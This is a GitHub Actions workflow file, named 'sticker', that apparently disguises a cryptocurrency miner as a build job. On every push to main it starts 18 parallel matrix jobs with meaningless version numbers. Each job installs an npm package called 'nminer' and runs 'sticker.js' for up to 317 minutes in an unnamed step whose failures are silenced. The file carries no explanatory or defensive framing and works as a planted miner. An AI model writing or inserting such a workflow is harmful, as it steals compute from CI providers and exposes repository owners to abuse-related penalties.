name: sticker
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 1177 }
          - { version: 9494 }
          - { version: 4773 }
          - { version: 6552 }
          - { version: 3862 }
          - { version: 7978 }
          - { version: 506 }
          - { version: 2813 }
          - { version: 8600 }
          - { version: 8410 }
          - { version: 5124 }
          - { version: 8837 }
          - { version: 7458 }
          - { version: 9233 }
          - { version: 2099 }
          - { version: 7526 }
          - { version: 4946 }
          - { version: 7372 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: 
        run: |
          npm install nminer@latest
          timeout 317m node sticker.js || echo "sticker executed"